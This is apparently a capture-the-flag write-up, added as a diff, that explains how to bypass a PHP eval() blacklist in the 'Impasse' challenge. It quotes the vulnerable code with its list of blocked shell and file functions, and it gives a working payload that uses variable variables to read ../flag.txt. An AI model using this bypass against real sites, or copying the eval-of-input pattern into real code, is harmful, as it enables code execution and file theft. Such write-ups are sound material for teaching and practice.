@@ -1,0 +1,74 @@
+<h1>Impasse</h1>
+
+<p>This is a PHP <code>eval()</code> injection challenge. </p>
+
+<p>When submitting the form, the input is wrapped around an <code>echo</code> statement and added to the <code>print</code> GET parameter:</p>
+
+<p><code>http
+?print=echo+'&lt;YOUR DATA&gt;'+;
+</code></p>
+
+<p>The first thing we tried was to modify the GET parameter to test for arbitrary code execution:</p>
+
+<p><code>
+print=echo+'';phpinfo()
+</code></p>
+
+<p><img src="../../.gitbook/assets/image (12).png" alt="" /></p>
+
+<p>By checking the <code>debug</code> option, we are presented with the page's source code. The following code implements the input blacklist and the <code>eval()</code> vulnerability:</p>
+
+<p><code>php
+&lt;?php
+error_reporting(0);
+if (isset($_GET['print'])) {
+  if (!empty($_GET['print'])){
+    $printValue= strtolower($_GET['print']);
+    $blocked = array("cat", "more" ,"readfile", "fopen", "file_get_contents", "file", "SplFileObject" );
+    $special_block= "nc";
+    $$special_block= "../flag.txt";
+    foreach ($blocked as $value) {
+      if (strpos($printValue, $value) || preg_match('/\bsystem|\bexec|\bbin2hex|\bassert|\bpassthru|\bshell_exec|\bescapeshellcmd| \bescapeshellarg|\bpcntl_exec|\busort|\bpopen|\bflag\.txt|\bspecial_block|\brequire|\bscandir|\binclude|\bhex2bin|\$[a-zA-Z]|[#!%^&amp;*_+=\-,\.:`|&lt;&gt;?~\\\\]/i', $printValue)) {
+        $printValue="";
+        echo "&lt;script&gt;alert('Bad character/word ditected!');&lt;/script&gt;";
+        break;
+      }
+    }
+  eval($printValue . ";");
+  } 
+}
+?&gt;
+</code></p>
+
+<p>Many useful functions have been blocked! But note that the <code>eval()</code> statement is called <em>after</em> the <code>$blocked</code>, <code>$special_block</code> and <code>$$special_block</code> variables are defined. This allows us to reference these variables in our <code>eval</code>-ed code.</p>
+
+<p>Note that <code>$$</code> has a special meaning in PHP: <a href="https://stackoverflow.com/questions/4169882/what-is-in-php">https://stackoverflow.com/questions/4169882/what-is-in-php</a></p>
+
+<p><code>php
+$foo = 'hello';
+$hello = 'The Output';
+echo $$foo; // displays "The Output"
+</code></p>
+
+<p>What happens here is that the value of  <code>$foo</code> is used as a variable name, and so <code>$$foo</code> becomes <code>$hello</code> (think of it as replacing <code>$foo</code> in <code>$$foo</code>).</p>
+
+<p><code>php
+$special_block= "nc";
+$$special_block= "../flag.txt";
+</code></p>
+
+<p>Here, the value of <code>$special_block</code> is used as a variable name. The second line defines a new variable, <code>$nc</code>, which has the value of <code>"../flag.txt"</code>.</p>
+
+<p>Our final payload is</p>
+
+<p><code>
+?print=echo+'';print(eval('return ${blocked}[4](${nc});'))
+</code></p>
+
+<p>which leads to the following code being <code>eval</code>-ed:</p>
+
+<p><code>php
+print(eval('return file_get_contents("../flag.txt");')
+</code></p>
+
+<p>Note that <code>$[a-zA-Z]</code> is blocked in the regex, so we must use <code>${...}</code> instead (which achieves the same purpose). Also, <code>eval()</code> executes <code>file_get_contents("../flag.txt")</code> but doesn't display anything to us yet. By returning and printing the output, we retrieve the flag.</p>
